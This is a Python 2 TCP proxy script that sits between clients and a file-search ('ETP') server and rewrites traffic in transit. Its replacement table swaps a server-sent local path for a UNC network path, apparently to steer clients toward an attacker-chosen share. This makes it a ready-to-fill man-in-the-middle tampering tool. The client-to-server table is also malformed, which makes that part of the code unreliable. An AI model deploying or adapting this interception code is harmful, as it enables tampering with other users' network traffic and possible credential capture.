from __future__ import print_function
import sys
from threading import Thread, Event
from socket import socket, timeout as SOCKET_TIMEOUT
from select import select
from Queue import Queue
from config import TIMEOUT_CLIENT_CONNECTION, TIMEOUT_REQ_CONNECTION, \
    EVERYTHING_SERVER_IP, ETP_PORT
from utils import recvall, vprint

SERVER2CLIENT_KEYNAME = "server2client"
CLIENT2SERVER_KEYNAME = "client2server"
SRC_KEY = 'SRC_STRING'
REPL_KEY = 'REPL_STRING'
replace_data = {
    SERVER2CLIENT_KEYNAME: [
        ("PATH C:\\Users\\<YOUR PATH TO REPLACE>", "PATH \\\\<PATH TO REPLACE TO>"),
    ],
    CLIENT2SERVER_KEYNAME: [{SRC_KEY: "",
                             REPL_KEY: ""}, ],
}


def get_manip_data(dst_conn_keyname, data):
    assert dst_conn_keyname in replace_data, \
        "Invalid dst_conn_keyname. must be: " + str(replace_data.keys())
    new_data = data
    for src_str, repl_str in replace_data[dst_conn_keyname]:
        new_data = new_data.replace(src_str, repl_str)
    return new_data


class HandleConnectionThread(Thread):
    def __init__(self, client_conn, client_addr, *args, **kargs):
        super(HandleConnectionThread, self).__init__(*args, **kargs)
        self._stop_event = Event()
        self.client_conn = client_conn
        self.client_addr = client_addr
        self.server_conn = socket()
        self.conns = [self.server_conn, self.client_conn]

    def stop(self):
        self.close_connection()
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

    def close_connection(self):
        print("[-] Closing Connection: " + str(self.client_addr),
              file=sys.stderr)
        for conn in self.conns:
            conn.close()
        self.conns.remove(self.server_conn)
        self.conns.remove(self.client_conn)

    def get_manipulated_data(self, dst_sck, data):
        dst_conn_keyname = CLIENT2SERVER_KEYNAME \
            if dst_sck is self.server_conn \
            else SERVER2CLIENT_KEYNAME
        return get_manip_data(dst_conn_keyname, data)

    def run(self):
        self.server_conn.settimeout(TIMEOUT_REQ_CONNECTION)
        try:
            self.server_conn.connect((EVERYTHING_SERVER_IP, ETP_PORT))
        except SOCKET_TIMEOUT:
            print("[!] [SOCKET_TIMEOUT] No Connection with ETP-Server at " +
                  str((EVERYTHING_SERVER_IP, ETP_PORT)),
                  file=sys.stderr)
            self.close_connection()
            return
        except Exception as e:
            print("[!] No Connection with ETP-Server at %s. Error: %s" %
                  (str((EVERYTHING_SERVER_IP, ETP_PORT)), str(e)),
                  file=sys.stderr)
            self.close_connection()
            return

        message_queues = {
            self.server_conn: Queue(),
            self.client_conn: Queue()
        }
        while self.conns:
            readable, writable, exceptional = select(
                self.conns, self.conns, [], TIMEOUT_CLIENT_CONNECTION)
            if not (readable or writable or exceptional):
                self.stop()
            for sck in readable:
                dst_sck = self.client_conn \
                    if sck is self.server_conn \
                    else self.server_conn
                data = recvall(sck)
                if not data:
                    self.stop()
                    break
                # Manipulating the Data:
                new_data = self.get_manipulated_data(dst_sck, data)
                message_queues[dst_sck].put(new_data)
            for sck in writable:
                if not message_queues[sck].empty():
                    next_msg = message_queues[sck].get_nowait()
                    prefix = "[server2client]"
                    if sck is self.server_conn:
                        prefix = "[client2server]"
                    vprint(prefix, next_msg)
                    sck.send(next_msg)
